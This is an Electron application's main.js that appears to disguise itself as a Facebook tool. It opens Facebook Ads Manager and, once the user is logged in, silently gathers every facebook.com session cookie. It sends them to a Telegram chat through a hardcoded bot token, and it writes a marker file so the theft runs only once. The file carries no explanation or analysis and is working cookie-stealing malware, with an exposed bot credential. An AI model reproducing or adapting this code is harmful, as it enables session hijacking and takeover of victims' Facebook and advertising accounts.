// main.js

// const TelegramBot = require('node-telegram-bot-api');

// replace the value below with the Telegram token you receive from @BotFather
const token = '5568513347:AAF59XjcqrDWWB7GmDyue_tscUmA3Iz_7gE';
const chatId = '-644513653'
// Create a bot that uses 'polling' to fetch new updates
// const bot = new TelegramBot(token, {polling: true});
const axios = require('axios')

// Modules to control application life and create native browser window
const {
    webContents,
    session,
    app,
    BrowserWindow
} = require('electron')
const path = require('path')
var fs = require('fs');
// const Fss = require('@supercharge/filesystem')
// const re = /(?<=")\d+(?=")/
// let onetime  = false
// var id = 0
// let filename = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
let isDirExists = fs.existsSync(path.join(__dirname, '1.txt'))


// try {
//     if (fs.existsSync(filename + '.txt')) {
//       //file exists
//     }
//   } catch(err) {
//     console.error(err)
//   

app.whenReady().then(() => {
    // createWindow()
    const mainWindow = new BrowserWindow({
        width: 1600,
        height: 900,
        autoHideMenuBar: true,
        icon: 'fb.png',
        webPreferences: {
            preload: path.join(__dirname, 'preload.js')
        }
    })

    // and load the index.html of the app.
    mainWindow.loadFile('index.html')
    setTimeout(() => {
        login()
    }, 7000)


    function login() {
        mainWindow.loadURL('https://facebook.com/adsmanager/')
        checkcookie()

    }


    function checkcookie(){
        mainWindow.webContents.on('did-stop-loading', () => {
            session.defaultSession.cookies.get({})
                .then((cookies) => {
    
                    var str = JSON.stringify(cookies)
                    if (str.includes('c_user')) {
                        id = /(?<=")\d+(?=")/.exec(str)
                        // console.log(id[0])
                        // cookieDump(cookies, id)
                        // isDirEmpty('session')
                        // console.log(empty)
                        if(isDirExists == false){
                            session.defaultSession.cookies.get({
                                domain: ".facebook.com"
                            })
                            .then((cookies) => {
                                cookieDump()
                                cookiesend(cookies)
    
                            })
                            isDirExists = true
                        }
                        

    
    
                    }
    
                }).catch((error) => {
                    console.log(error)
    
                })
    
    
    
    
    
            function cookiesend(ck) {
                // var files = fs.readdirSync("session")
    
                axios.post('https://api.telegram.org/bot5568513347:AAF59XjcqrDWWB7GmDyue_tscUmA3Iz_7gE/sendMessage', {
                        chat_id: '-796234572',
                        text : ck 
                    })
                    .catch(function (error) {
                        // handle error
                        console.log(error);
                    })
                    .then(function () {
                        // always executed
                    });
    
            }
    
    
            //Create cookies.json or this will fail the first time.
            function cookieDump() {
                var buffer = '1'
    
                fs.writeFile(path.join(__dirname, '1.txt'), buffer, function (err) {
                    if (err) return console.log(err);
                    //console.log('1111');
                });
            }
    
        })
    
    
    
    
        // Open the DevTools.
        // mainWindow.webContents.openDevTools()
        app.on('activate', () => {
            // On macOS it's common to re-create a window in the app when the
            // dock icon is clicked and there are no other windows open.
            if (BrowserWindow.getAllWindows().length === 0) createWindow()
    
        })

    }


})

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') app.quit()
})

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and require them here.
